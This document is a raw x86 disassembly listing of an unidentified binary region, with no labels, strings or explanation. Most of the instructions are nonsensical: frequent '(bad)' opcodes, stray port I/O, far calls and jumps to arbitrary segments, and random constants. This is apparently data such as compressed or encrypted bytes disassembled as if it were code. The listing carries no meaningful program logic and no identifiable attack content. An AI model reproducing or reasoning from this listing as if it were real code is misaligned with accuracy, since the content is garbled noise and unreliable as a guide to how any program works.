  4289b3:	(bad)  
  4289b4:	loop   0x4289b6
	...
  428a16:	dec    ebp
  428a17:	or     al,0xf8
  428a19:	pop    ebx
  428a1a:	stc    
  428a1b:	(bad)  
  428a1c:	out    dx,eax
  428a1d:	push   ds
  428a1e:	push   ss
  428a1f:	xchg   edx,eax
  428a20:	data16 aas 
  428a22:	jle    0x428a05
  428a24:	enter  0xf829,0xb1
  428a28:	add    DWORD PTR [eax],eax
  428a2a:	pop    es
  428a2b:	add    DWORD PTR [eax],eax
  428a2d:	add    BYTE PTR [esi-0x11efcb2c],al
  428a33:	sub    edx,DWORD PTR [esi+ebp*2+0x7bcb2a12]
  428a3a:	ficomp DWORD PTR [ebx]
  428a3c:	enter  0xd13f,0x2e
  428a40:	cs (bad) 
  428a42:	cld    
  428a43:	cli    
  428a44:	xor    ecx,DWORD PTR [esi+eiz*2]
  428a47:	mov    edx,0x9f73020b
  428a4c:	cmp    eax,0x70276a6a
  428a51:	sub    BYTE PTR [ebx+0x7b93f29e],0xb9
  428a58:	test   al,0x14
  428a5a:	mov    eax,ds:0x129fa275
  428a5f:	jno    0x428a68
  428a61:	sbb    al,0xe0
  428a63:	xchg   ebp,eax
  428a64:	push   esi
  428a65:	mov    al,ds:0xf690c579
  428a6a:	xor    DWORD PTR [esi+0x31781632],0x74
  428a71:	push   ebp
  428a72:	inc    DWORD PTR [ebp+0x3af55bd7]
  428a78:	and    DWORD PTR [ebp-0x19396c5d],0x935715a4
  428a82:	in     eax,0xa0
  428a84:	jbe    0x428aa8
  428a86:	data16 mov ah,0xec
  428a89:	xor    eax,0xbef63360
  428a8e:	aas    
  428a8f:	jne    0x428abe
  428a91:	and    esi,DWORD PTR [esi+ebp*2]
  428a94:	xor    eax,0xabc25aa2
  428a99:	jbe    0x428a1e
  428a9b:	je     0x428ad6
  428a9d:	(bad)  
  428a9e:	(bad)  
  428a9f:	pop    esp
  428aa0:	jae    0x428af8
  428aa2:	shl    DWORD PTR [eax],0x3e
  428aa5:	add    al,0xef
  428aa7:	add    bl,BYTE PTR [esi+0x24]
  428aaa:	cmp    esi,DWORD PTR [edx]
  428aac:	pop    ecx
  428aad:	mov    cl,0xc6
  428aaf:	pop    esi
  428ab0:	hlt    
  428ab1:	push   ebx
  428ab2:	xchg   ebx,eax
  428ab3:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  428ab5:	xor    bh,BYTE PTR [ebx+0x55aea9a]
  428abb:	test   al,0xc4
  428abd:	jns    0x428b37
  428abf:	retf   
  428ac0:	mov    ebp,0x24b88791
  428ac5:	into   
  428ac6:	rol    DWORD PTR [eax],1
  428ac8:	push   esi
  428ac9:	loop   0x428aa6
  428acb:	mov    edx,0x62cc4d5f
  428ad0:	mov    WORD PTR [ecx],es
  428ad2:	ret    0x5249
  428ad5:	pop    edx
  428ad6:	or     bh,BYTE PTR [ebp+0x4d329da1]
  428adc:	ss retf 0xd10d
  428ae0:	sub    eax,0xf42082db
  428ae5:	arpl   WORD PTR [ebx+0x51],bp
  428ae8:	in     al,dx
  428ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428aea:	popf   
  428aeb:	mov    esp,0xe9cc2404
  428af0:	(bad)  
  428af1:	push   0x21
  428af3:	repz repz jnp 0x428b35
  428af7:	retf   0x2468
  428afa:	scas   eax,DWORD PTR es:[edi]
  428afb:	lods   eax,DWORD PTR ds:[esi]
  428afc:	aaa    
  428afd:	clc    
  428afe:	lods   al,BYTE PTR ds:[esi]
  428aff:	xor    dl,BYTE PTR [ebx+0x2d7091fc]
  428b05:	gs (bad) 
  428b07:	sbb    al,0xd6
  428b09:	xchg   edi,eax
  428b0a:	inc    BYTE PTR [esi+eiz*4+0x65]
  428b0e:	pushf  
  428b0f:	xor    dh,bh
  428b11:	sub    BYTE PTR [esi-0x468fd0a9],0x8c
  428b18:	ja     0x428ad6
  428b1a:	push   esi
  428b1b:	adc    DWORD PTR [ecx-0x3833b509],ecx
  428b21:	bound  edi,QWORD PTR [ebx+0x50fd069]
  428b27:	in     eax,0xc3
  428b29:	or     BYTE PTR [ebx+0x781b8d9e],dh
  428b2f:	cmp    esp,DWORD PTR [edx]
  428b31:	sub    ch,ah
  428b33:	adc    al,0xe
	...
  428b95:	add    ch,al
  428b97:	push   ebp
  428b98:	mov    bh,dl
  428b9a:	call   0x5fb1:0xb77ff5ff
  428ba1:	test   eax,0x448e98ff
  428ba6:	push   DWORD PTR [edx+0x1070001]
  428bac:	add    BYTE PTR [eax],al
  428bae:	sti    
  428baf:	sub    dl,bl
  428bb1:	ror    DWORD PTR [esi-0x4e],0x3e
  428bb5:	fld    st(3)
  428bb7:	xchg   edx,eax
  428bb8:	lds    ebp,FWORD PTR [esp+ebp*8-0x45]
  428bbc:	call   0x6840:0xbfedcadf
  428bc3:	xor    al,0x4c
  428bc5:	jmp    0x428c04
  428bc7:	xchg   ecx,eax
  428bc8:	arpl   WORD PTR [esi-0x71],cx
  428bcb:	pop    edi
  428bcc:	(bad)  
  428bcd:	fidivr DWORD PTR [ecx+0x1e]
  428bd0:	pop    edi
  428bd1:	cmp    DWORD PTR [ebp-0x12bbc907],ebp
  428bd7:	ss or  cl,bh
  428bda:	(bad)  
  428bdc:	pop    eax
  428bdd:	lds    ebx,FWORD PTR [eax+0x4ae39968]
  428be3:	aad    0x48
  428be5:	inc    ecx
  428be6:	fndisi(8087 only) 
  428be8:	sahf   
  428be9:	inc    ebp
  428bea:	mov    bh,0x64
  428bec:	(bad)
  428bf0:	xchg   ebp,eax
  428bf1:	lods   eax,DWORD PTR ds:[esi]
  428bf2:	dec    ebx
  428bf3:	push   cs
  428bf4:	fisubr DWORD PTR [ecx-0x13404d34]
  428bfa:	ror    BYTE PTR [ebp+eiz*4+0x27],cl
  428bfe:	fsub   DWORD PTR [esi]
  428c00:	or     esi,edi
  428c02:	loope  0x428b86
  428c04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c05:	ds cmp eax,eax
  428c08:	sbb    ax,0x8909
  428c0c:	popf   
  428c0d:	lds    eax,FWORD PTR [edx]
  428c0f:	cli    
  428c10:	mov    WORD PTR [esi],gs
  428c12:	and    esp,DWORD PTR [edx]
  428c14:	mov    edx,0xc09cdf73
  428c19:	cwde   
  428c1a:	std    
  428c1b:	(bad)  
  428c1c:	int3   
  428c1d:	rol    BYTE PTR [edi+edx*8],0x81
  428c21:	int3   
  428c22:	out    dx,eax
  428c23:	arpl   WORD PTR [ebp-0x741735ee],dx
  428c29:	push   ax
  428c2b:	lds    eax,FWORD PTR [esi+0x3f]
  428c2e:	fld    TBYTE PTR [edx+0x3fd3f8f2]
  428c34:	jo     0x428c9e
  428c36:	sub    eax,0xeadc4277
  428c3b:	loop   0x428c80
  428c3d:	sbb    cl,bh
  428c3f:	pcmpeqw mm5,QWORD PTR [ebp-0x4a25cc51]
  428c46:	call   0x5672:0x914b2732
  428c4d:	mov    edx,0xb08fbceb
  428c52:	and    al,BYTE PTR [edi-0x72]
  428c55:	test   al,0x7e
  428c57:	xchg   edx,eax
  428c58:	in     al,0x29
  428c5a:	call   0x3dee:0xef953552
  428c61:	clc    
  428c62:	rol    DWORD PTR [edi],1
  428c64:	fs sub al,0x84
  428c67:	cwde   
  428c68:	sbb    BYTE PTR [ebp-0x3f],bh
  428c6b:	jbe    0x428c7a
  428c6d:	leave  
  428c6e:	inc    ebx
  428c6f:	sahf   
  428c70:	out    dx,al
  428c71:	dec    ebp
  428c72:	das    
  428c73:	push   esi
  428c74:	into   
  428c75:	xchg   ebx,eax
  428c76:	push   edi
  428c77:	cdq    
  428c78:	xor    BYTE PTR [edi],bh
  428c7a:	push   es
  428c7b:	inc    eax
  428c7c:	or     DWORD PTR [eax+0x55],ecx
  428c7f:	adc    esp,DWORD PTR [esi]
  428c81:	stos   BYTE PTR es:[edi],al
  428c82:	or     al,0x62
  428c84:	cmp    al,0x33
  428c86:	fld    QWORD PTR [edx+esi*8+0x76]
  428c8a:	push   edx
  428c8b:	cwde   
  428c8c:	repz sub ebp,DWORD PTR [edi]
  428c8f:	ret    0xa245
  428c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c93:	cld    
  428c94:	pop    eax
  428c95:	jp     0x428c64
  428c97:	pushf  
  428c98:	xchg   BYTE PTR ds:0xb1db376e,bh
  428c9e:	inc    edi
  428c9f:	sub    eax,0x1ff089ae
  428ca4:	rcr    BYTE PTR [edi-0x5612e6f],cl
  428caa:	cli    
  428cab:	mov    dh,0xfc
  428cad:	or     al,0x8e
  428caf:	adc    al,0x56
  428cb1:	adc    DWORD PTR [eax+0x49b],ecx
	...
  428d13:	add    BYTE PTR [eax],al
  428d15:	add    BYTE PTR [ecx-0xace0e4b],al
  428d1b:	jne    0x428cde
  428d1d:	mov    ch,0x86
  428d1f:	xchg   esi,eax
  428d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d21:	jns    0x428d8e
  428d23:	imul   esi,DWORD PTR [ecx+eiz*2],0x6
  428d27:	mov    ah,0x1
  428d29:	add    BYTE PTR [edi],al
  428d2b:	add    DWORD PTR [eax],eax
  428d2d:	add    BYTE PTR [edx],bl
  428d2f:	push   ebp
  428d30:	jnp    0x428d92
  428d32:	mov    eax,ds:0xc028cb72
  428d37:	mov    dl,0x8e
  428d39:	push   ds
  428d3a:	cmc    
  428d3b:	sbb    ebx,0xffffffe9
  428d3e:	xchg   edx,eax
  428d3f:	das    
  428d40:	scas   al,BYTE PTR es:[edi]
  428d41:	pop    ebp
  428d42:	scas   eax,DWORD PTR es:[edi]
  428d43:	mov    ebp,0xc2ce9808
  428d48:	imul   esp,DWORD PTR [edi+0x7],0x79
  428d4c:	in     al,0x43
  428d4e:	jno    0x428cd1
  428d50:	inc    esi
  428d51:	jmp    0x68dc:0x1d7e71ab
  428d58:	iret   
  428d59:	ds (bad) 
  428d5b:	adc    esi,ecx
  428d5d:	in     al,dx
  428d5e:	mov    edx,0xef97ae8b
  428d63:	inc    ebx
  428d64:	add    al,0x22
  428d66:	mov    ah,BYTE PTR [esi-0x3a653211]
  428d6c:	pop    ss
  428d6d:	div    DWORD PTR [edi-0x708858d9]
  428d73:	ret    0x742c
  428d76:	or     ebx,DWORD PTR [esi+0x5a]
  428d79:	sbb    bh,BYTE PTR [ecx+0x6]
  428d7c:	clc    
  428d7d:	retf   
  428d7e:	ins    DWORD PTR es:[edi],dx
  428d7f:	jecxz  0x428d74
  428d81:	int3   
  428d82:	out    0x8c,eax
  428d84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d85:	in     al,0x38
  428d87:	sahf   
  428d88:	mov    cl,0x4
  428d8a:	and    BYTE PTR [ecx-0x43],dh
  428d8d:	shl    BYTE PTR [edi],1
  428d8f:	or     al,0xed
  428d91:	cmp    al,0xf8
  428d93:	aam    0xe6
  428d95:	rol    ah,0x1f
  428d98:	jmp    0x428d6c
  428d9a:	neg    BYTE PTR ss:[esi]
  428d9d:	add    edi,esp
  428d9f:	mov    ecx,DWORD PTR [edi+0x1f3b1a61]
  428da5:	out    dx,al
  428da6:	mov    ebp,0x1a12f39f
  428dab:	in     al,dx
  428dac:	push   esi
  428dad:	imul   eax,DWORD PTR [esi],0x20
  428db0:	(bad)  ds:0xa024176d
  428db6:	loopne 0x428e13
  428db8:	mov    ds,WORD PTR [ecx]
  428dba:	sbb    ah,cl
  428dbc:	fmul   DWORD PTR [ecx-0xa3e0dd6]
  428dc2:	or     BYTE PTR [ebx+0x2d83b45e],bh
  428dc8:	xchg   DWORD PTR [ebx-0x3e],ebp
  428dcb:	jb     0x428e00
  428dcd:	jo     0x428e2c
  428dcf:	hlt    
  428dd0:	jecxz  0x428e34
  428dd2:	scas   eax,DWORD PTR es:[edi]
  428dd3:	sub    al,0x15
  428dd5:	(bad)  
  428dd6:	in     eax,0x1a
  428dd8:	and    cl,BYTE PTR [esi+edx*4]
  428ddb:	mov    ebx,ebx
  428ddd:	xchg   ebp,eax
  428dde:	je     0x428dbc
  428de0:	jmp    0xdca:0x88e5bd7c
  428de7:	repz retf 
  428de9:	pmuludq mm3,QWORD PTR [ecx+0x20]
  428ded:	out    dx,al
  428dee:	jb     0x428d7b
  428df0:	adc    al,dl
  428df2:	pop    edx
  428df3:	ret    
  428df4:	jmp    0x3dae:0x9b6dcd4b
  428dfb:	sub    DWORD PTR [ebx-0x3002826b],esi
  428e01:	mov    ds:0xb41a5f9b,al
  428e06:	fisubr DWORD PTR [edx]
  428e08:	aam    0x7b
  428e0a:	out    dx,eax
  428e0b:	sar    ebx,1
  428e0d:	mov    bh,0xc
  428e0f:	pop    eax
  428e10:	rcr    DWORD PTR [edi+0x14997ac0],0x24
  428e17:	es fadd st,st(2)
  428e1a:	mov    ah,0x59
  428e1c:	mov    BYTE PTR [eax+edi*4+0x53],ch
  428e20:	mov    bl,0xc2
  428e22:	mov    cl,0xe8
  428e24:	sahf   
  428e25:	fimul  DWORD PTR [esi+0x2b233877]
  428e2b:	retf   
  428e2c:	jecxz  0x428e49
  428e2e:	or     ebp,DWORD PTR [eax]
  428e30:	mov    ebx,0xbc1ecf66
	...
  428e95:	add    BYTE PTR [edi+0x5d],cl
  428e98:	pop    ecx
  428e99:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428e9d:	(bad)  
  428e9f:	cli    
  428ea0:	test   al,0xd9
  428ea2:	and    edi,DWORD PTR ds:0xb50da00e
  428ea8:	add    DWORD PTR [eax],eax
  428eaa:	pop    es
  428eab:	add    DWORD PTR [eax],eax
  428ead:	add    BYTE PTR [eax-0x1a306bc4],dl
  428eb3:	add    bh,dl
  428eb5:	icebp  
  428eb6:	jbe    0x428ef6
  428eb8:	mov    WORD PTR [ecx-0x1c],ds
  428ebb:	mov    cl,0xa2
  428ebd:	scas   eax,DWORD PTR es:[edi]
  428ebe:	xor    ch,BYTE PTR [eax+0x2c0d2b9f]
  428ec4:	(bad)  
  428ec5:	cmp    al,0x87
  428ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ec8:	inc    esp
  428ec9:	push   0xdda6b023
  428ece:	mov    cl,0xe7
  428ed0:	mov    bh,ah
  428ed2:	ja     0x428ef1
  428ed4:	dec    edx
  428ed5:	add    al,0x6b
  428ed7:	jb     0x428e76
  428ed9:	adc    al,BYTE PTR [eax+0x15]
  428edc:	xor    edi,DWORD PTR [eax+0x36]
  428edf:	aad    0x6f
  428ee1:	fst    st(6)
  428ee3:	scas   eax,DWORD PTR es:[edi]
  428ee4:	cmp    BYTE PTR [eax+eiz*2],dh
  428ee7:	cmc    
  428ee8:	or     BYTE PTR [esi],ah
  428eea:	popa   
  428eeb:	mov    eax,0x685fe357
  428ef0:	sub    ebp,DWORD PTR cs:[ebx]
  428ef3:	(bad)  
  428ef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ef5:	pop    ss
  428ef6:	hlt    
  428ef7:	ja     0x428f4a
  428ef9:	je     0x428e95
  428efb:	jmp    0xd895:0xf25d0a37
  428f02:	xor    BYTE PTR [edi],ah
  428f04:	xchg   edx,eax
  428f05:	nop
  428f06:	add    esp,DWORD PTR es:[esi-0x22]
  428f0a:	fnsave [esi]
  428f0c:	jnp    0x428f66
  428f0e:	mov    esp,0xb7906355
  428f13:	push   eax
  428f14:	mov    ebp,DWORD PTR [edx-0x540e84a7]
  428f1a:	mov    WORD PTR [esi],gs
  428f1c:	adc    ecx,DWORD PTR [ecx]
  428f1e:	dec    esi
  428f1f:	push   ds
  428f20:	jle    0x428ee6
  428f22:	sbb    eax,0x6e39d513
  428f27:	int3   
  428f28:	pop    esp
  428f29:	push   ss
  428f2a:	aaa    
  428f2b:	fisubr DWORD PTR ds:0x58ec8752
  428f31:	(bad)  
  428f32:	lds    ecx,FWORD PTR [edi+edx*2-0x7931f0f]
  428f39:	mov    eax,0x79972b8b
  428f3e:	lahf   
  428f3f:	add    BYTE PTR [ebx-0x29],ch
  428f42:	sbb    eax,0x22469eb7
  428f47:	je     0x428fb3
  428f49:	ret    
  428f4a:	cwde   
  428f4b:	mov    esi,0x677d406b
  428f50:	adc    edx,DWORD PTR [ebx-0x1bdd820f]
  428f56:	inc    eax
  428f57:	jge    0x428ede
  428f59:	cmp    dh,ch
  428f5b:	mov    al,ds:0x971327ee
  428f60:	scas   eax,DWORD PTR es:[edi]
  428f61:	pop    ebp
  428f62:	repnz push edi
  428f64:	adc    al,0x8b
  428f66:	xchg   ebx,eax
  428f67:	dec    ebp
  428f68:	je     0x428fdb
  428f6a:	xchg   ebp,eax
  428f6b:	xchg   DWORD PTR [eax+0x6d52c176],edi
  428f71:	(bad)  
  428f72:	xor    BYTE PTR [esi+0x5ed8910b],ah
  428f78:	xchg   esp,eax
  428f79:	cld    
  428f7a:	push   ebx
  428f7b:	pop    eax
  428f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f7d:	add    ch,BYTE PTR [edi+0x255d79b8]
  428f83:	or     cl,ch
  428f85:	cmp    eax,0x86f6030a
  428f8a:	(bad)  
  428f8b:	(bad)  
  428f8d:	ret    
  428f8e:	inc    edx
  428f8f:	aas    
  428f90:	lods   al,BYTE PTR ds:[esi]
  428f91:	je     0x428fa8
  428f93:	push   cs
  428f94:	pop    esi
  428f95:	mov    ?,WORD PTR [edx]
  428f97:	jmp    0x428f28
  428f99:	push   ecx
  428f9a:	test   DWORD PTR [edx-0x6713e965],0xd043c638
  428fa4:	inc    esp
  428fa5:	shl    DWORD PTR [ecx+0x51],0xf0
  428fa9:	cmp    dh,BYTE PTR [esi+ebx*1+0x56]
  428fad:	and    eax,0x3c7a9d45
  428fb2:	arpl   WORD PTR [edi+0x7],sp
	...
  429015:	add    cl,ah
  429017:	in     al,dx
  429018:	mov    ebx,es
  42901a:	(bad)  
  42901b:	jecxz  0x42900c
  42901d:	out    dx,al
  42901e:	arpl   WORD PTR [esi+0x79],cx
  429021:	sbb    DWORD PTR [ecx],esi
  429023:	arpl   ax,sp
  429025:	push   edi
  429026:	adc    al,0xb6
  429028:	add    DWORD PTR [eax],eax
  42902a:	pop    es
  42902b:	add    DWORD PTR [eax],eax
  42902d:	add    BYTE PTR [edx+ebx*2-0x7739c980],ch
  429034:	inc    edi
  429035:	out    0x5d,eax
  429037:	vsqrtss xmm2,xmm1,xmm5
  42903b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42903c:	and    al,0x5e
  42903e:	out    0xe0,eax
  429040:	sbb    BYTE PTR [ebp+eiz*1+0x20],cl
  429044:	(bad)  [ecx+eax*1-0x50]
  429048:	mov    bl,0x20
  42904a:	add    edi,eax
  42904c:	sar    DWORD PTR [ebx],1
  42904e:	sbb    DWORD PTR [ebx],esp
  429050:	cmc    
  429051:	inc    ebp
  429052:	std    
  429053:	enter  0xe7c9,0x37
  429057:	mov    ds:0xa6199d40,eax
  42905c:	jl     0x429020
  42905e:	inc    ebx
  42905f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429060:	adc    bl,cl
  429062:	push   esp
  429063:	ja     0x42906d
  429065:	xor    bh,BYTE PTR [esi+0x2f79dcb4]
  42906b:	inc    ebx
  42906c:	inc    edi
  42906d:	hlt    
  42906e:	dec    edi
  42906f:	test   al,0xfb
  429071:	jle    0x429098
  429073:	ins    BYTE PTR es:[edi],dx
  429074:	ss retf 
  429076:	xor    eax,0xd911f14d
  42907b:	stos   DWORD PTR es:[edi],eax
  42907c:	jp     0x429082
  42907e:	es mov edx,0x9a1d3a10
  429084:	mov    edi,esp
  429086:	int3   
  429087:	or     eax,ecx
  429089:	mul    BYTE PTR [edx+edx*8]
  42908c:	lods   eax,DWORD PTR ds:[esi]
  42908d:	mov    ah,0xcb
  42908f:	mov    al,0x58
  429091:	push   cs
  429092:	cwde   
  429093:	pop    bp
  429095:	fbld   TBYTE PTR [ebx]
  429097:	stos   DWORD PTR es:[edi],eax
  429098:	fisub  DWORD PTR [ebp+0x3e2f6a8]
  42909e:	pop    ebx
  42909f:	mov    ah,dl
  4290a1:	inc    ebp
  4290a2:	xchg   edi,eax
  4290a3:	ja     0x429071
  4290a5:	cmp    DWORD PTR [edx+0x5d6dac27],edi
  4290ab:	pop    edx
  4290ac:	gs dec esp
  4290ae:	xor    esi,DWORD PTR [edi]
  4290b0:	cmp    BYTE PTR [ebx+0x65c229a7],0xc3
  4290b7:	lods   eax,DWORD PTR ds:[esi]
  4290b8:	sar    DWORD PTR [edi-0x247eb2f6],1
  4290be:	call   0xe635:0x78146396
  4290c5:	sbb    ebp,0x9
  4290c8:	(bad)  
  4290c9:	out    0x4f,al
  4290cb:	jb     0x429070
  4290cd:	lods   al,BYTE PTR ds:[esi]
  4290ce:	dec    edi
  4290cf:	mov    edi,0xe213ae17
  4290d4:	xlat   BYTE PTR ds:[ebx]
  4290d5:	xlat   BYTE PTR ds:[ebx]
  4290d6:	mov    ah,0x7
  4290d8:	push   esi
  4290d9:	adc    BYTE PTR [eax-0x68b74e66],bl
  4290df:	pusha  
  4290e0:	pop    es
  4290e1:	or     edx,DWORD PTR [ebx]
  4290e3:	sub    DWORD PTR [edi],edi
  4290e5:	(bad)  
  4290e6:	leave  
  4290e7:	aad    0xbb
  4290e9:	sub    ebp,0x8841472e
  4290ef:	pop    edx
  4290f0:	test   ch,bl
  4290f2:	inc    ebp
  4290f3:	xor    cl,BYTE PTR [ebp-0x15]
  4290f6:	xor    esi,DWORD PTR [edi+0x4b]
  4290f9:	push   edi
  4290fa:	cmp    esp,DWORD PTR [esi]
  4290fc:	jle    0x429154
  4290fe:	xchg   BYTE PTR [ebp-0x293cdbcd],cl
  429104:	push   edi
  429105:	jno    0x429179
  429107:	fmul   st(4),st
  429109:	ds sbb eax,0xcaff002f
  42910f:	(bad)  
  429110:	cmc    
  429111:	and    DWORD PTR [ebx+0x3cac3eef],ebp
  429117:	call   0x15cc3c86
  42911c:	test   eax,0x8efa6a5b
  429121:	lahf   
  429122:	loop   0x429123
  429124:	(bad)  
  429125:	pop    ebx
  429126:	add    ch,BYTE PTR [ebp-0x79]
  429129:	inc    ebp
  42912a:	popf   
  42912b:	mov    dl,0x50
  42912d:	dec    esp
  42912e:	je     0x4290db
  429130:	xor    al,0xba
  429132:	loope  0x42913f
  429134:	push   edx
	...
  429195:	add    BYTE PTR [esi-0x79],dl
  429198:	std    
  429199:	test   ch,bh
  42919b:	(bad)  
  42919c:	jg     0x429175
  42919e:	xor    dh,0xd6
  4291a1:	stos   DWORD PTR es:[edi],eax
  4291a2:	mov    ds:0x1bf82a6b,al
  4291a7:	mov    bh,0x1
  4291a9:	add    BYTE PTR [edi],al
  4291ab:	add    DWORD PTR [eax],eax
  4291ad:	add    BYTE PTR [ebp-0x43],dh
  4291b0:	rcl    BYTE PTR [esi+0x3a077a5d],cl
  4291b6:	lds    eax,FWORD PTR [ebx]
  4291b8:	or     eax,0x43412533
  4291bd:	sub    DWORD PTR [edi-0x7de2eaf1],esp
  4291c3:	dec    edi
  4291c4:	mov    WORD PTR [edx+0x401dd0c5],gs
  4291ca:	std    
  4291cb:	jo     0x4291e7
  4291cd:	fstp   DWORD PTR [edx-0xeb37a6a]
  4291d3:	push   esi
  4291d4:	adc    DWORD PTR [esi],edx
  4291d6:	mov    bh,0x3
  4291d8:	sbb    eax,0x69db5a97
  4291dd:	shl    DWORD PTR [ecx+0x3e],1
  4291e0:	jae    0x42919a
  4291e2:	adc    eax,0xfd2efd62
  4291e7:	test   DWORD PTR [ebp+0x16],edi
  4291ea:	(bad)  
  4291eb:	aad    0xe1
  4291ed:	cs jmp 0x677f:0x7d26b875
  4291f5:	mov    ds:0xecefd477,eax
  4291fa:	stos   BYTE PTR es:[edi],al
  4291fb:	mov    ecx,0x1db196c2
  429200:	xchg   ecx,eax
  429201:	pop    ebp
  429202:	add    dh,dl
  429204:	enter  0x9d7a,0x35
  429208:	repnz cli 
  42920a:	push   ebx
  42920b:	mov    ds:0x49f5e339,al
  429210:	ds jne 0x4291dd
  429213:	inc    ebp
  429214:	scas   al,BYTE PTR es:[edi]
  429215:	(bad)  
  429216:	inc    eax
  429217:	mov    bh,cl
  429219:	pop    ds
  42921a:	jge    0x4291e7
  42921c:	xchg   esp,eax
  42921d:	or     cl,BYTE PTR [edi-0x1b0c1dd1]
  429223:	xchg   esp,eax
  429224:	xchg   edi,eax
  429225:	cwde   
  429226:	dec    esi
  429227:	(bad)  
  429228:	iret   
  429229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42922a:	lods   eax,DWORD PTR ds:[esi]
  42922b:	mov    ch,0x9a
  42922d:	lock mov edi,0x3d4a2921
  429233:	clc    
  429234:	pop    es
  429235:	and    BYTE PTR [edx+0x3a],0x5e
  429239:	mov    edi,0x4742ea21
  42923e:	jbe    0x429239
  429240:	das    
  429241:	mov    ds:0xbc13ea1d,al
  429246:	push   eax
  429247:	inc    ecx
  429248:	xor    BYTE PTR [ebx],bh
  42924a:	dec    esp
  42924b:	add    DWORD PTR [edx-0x6b],ebp
  42924e:	jle    0x429265
  429250:	ins    BYTE PTR es:[edi],dx
  429251:	adc    eax,0x6db18c10
  429256:	out    dx,al
  429257:	rol    cl,cl
  429259:	js     0x42920e
  42925b:	stos   BYTE PTR es:[edi],al
  42925c:	cmc    
  42925d:	icebp  
  42925e:	cs loop 0x4292b6
  429261:	aam    0xab
  429263:	xchg   edx,eax
  429264:	call   0xe44:0x895c6b79
  42926b:	mov    bh,0xc5
  42926d:	add    BYTE PTR [ebp+0x7c],ch
  429270:	mov    dh,0x3c
  429272:	ins    BYTE PTR es:[edi],dx
  429273:	jmp    0x4292a6
  429275:	rcr    BYTE PTR [eax+0x29fc2f82],0xf5
  42927c:	dec    edx
  42927d:	jle    0x4292f1
  42927f:	xlat   BYTE PTR ds:[ebx]
  429280:	rcl    BYTE PTR [esp+ebx*8],1
  429283:	js     0x429253
  429285:	xchg   ebx,eax
  429286:	jle    0x429297
  429288:	mov    ds,WORD PTR [ebp-0xa81519f]
  42928e:	or     eax,DWORD PTR [eax+0x77]
  429291:	jmp    0x786dc809
  429296:	retf   
  429297:	xchg   ebp,eax
  429298:	in     al,0x5b
  42929a:	aad    0x75
  42929c:	nop
  42929d:	push   0x1e04b859
  4292a2:	add    BYTE PTR [ebp+ecx*8+0x24185860],al
  4292a9:	loopne 0x42929d
  4292ab:	push   edi
  4292ac:	xchg   edx,eax
  4292ad:	and    eax,0x755cef23
  4292b2:	and    bh,ah
  4292b4:	and    al,BYTE PTR [eax]
	...
  429316:	lock adc al,0xe1
  429319:	(bad)  
  42931a:	in     eax,0xff
  42931c:	call   FWORD PTR [esi]
  42931e:	xor    cl,BYTE PTR [ebx-0xc]
  429321:	fs mov ebx,0x224905d2
  429327:	mov    eax,0x1070001
  42932c:	add    BYTE PTR [eax],al
  42932e:	fiadd  DWORD PTR ds:0xd10331fa
  429334:	ds dec ecx
  429336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429337:	mov    eax,esp
  429339:	stos   DWORD PTR es:[edi],eax
  42933a:	fidiv  WORD PTR [ebx-0x46]
  42933d:	cs cwde 
  42933f:	sbb    BYTE PTR [ebp-0x57],ch
  429342:	mov    BYTE PTR [eax],cl
  429344:	inc    ebp
  429345:	sub    BYTE PTR [ebp+0x3c],0x70
  429349:	mov    eax,ds:0x773f8a6c
  42934e:	push   ds
  42934f:	sub    BYTE PTR [ebx+esi*2+0x13],ch
  429353:	call   0x885205fb
  429358:	stos   DWORD PTR es:[edi],eax
  429359:	mov    ebx,gs
  42935b:	inc    ebx
  42935c:	aas    
  42935d:	arpl   WORD PTR [ecx-0x39],bx
  429360:	fwait
  429361:	(bad)  
  429362:	sti    
  429363:	inc    ecx
  429364:	sub    DWORD PTR ds:0xc33bea8b,0x923e3479
  42936e:	xchg   ecx,eax
  42936f:	ja     0x429325
  429371:	imul   edx,DWORD PTR [esi],0x52a4b289
  429377:	sbb    ecx,ecx
  429379:	sub    dl,ch
  42937b:	out    0x37,al
  42937d:	xchg   DWORD PTR [ecx+eiz*1],eax
  429380:	aaa    
  429381:	dec    edx
  429382:	into   
  429383:	sub    edx,ebx
  429385:	fstp   QWORD PTR [edi-0x5e]
  429388:	cli    
  429389:	jmp    0x4293ff
  42938b:	shl    DWORD PTR [ebx],0xde
  42938e:	push   ecx
  42938f:	std    
  429390:	inc    edi
  429391:	mov    esp,0xef3e05af
  429396:	xor    ah,al
  429398:	pop    edx
  429399:	shr    cl,cl
  42939b:	les    edx,FWORD PTR [edi+0x1d]
  42939e:	pop    esp
  42939f:	or     BYTE PTR [ecx],0x7d
  4293a2:	dec    eax
  4293a3:	adc    al,0x77
  4293a5:	mov    ecx,0x7b1f32c8
  4293aa:	push   0xffffff99
  4293ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4293ad:	adc    al,0xe7
  4293af:	shl    esi,0xee
  4293b2:	inc    esi
  4293b3:	mov    ah,0xd3
  4293b5:	push   es
  4293b6:	push   ds
  4293b7:	or     al,0x20
  4293b9:	mov    dh,BYTE PTR [esi+0xc2f7b28]
  4293bf:	pop    esp
  4293c0:	push   esp
  4293c1:	sbb    BYTE PTR [edx],al
  4293c3:	mov    ds:0xceb2e576,al
  4293c8:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293ca:	test   DWORD PTR [ebp-0x40],esp
  4293cd:	pop    eax
  4293ce:	pop    esp
  4293cf:	jnp    0x4293c0
  4293d1:	xchg   BYTE PTR [esi],dh
  4293d3:	cli    
  4293d4:	mov    ds:0x43a13b91,eax
  4293d9:	xchg   ebp,eax
  4293da:	jnp    0x4293ad
  4293dc:	adc    al,0xcb
  4293de:	inc    eax
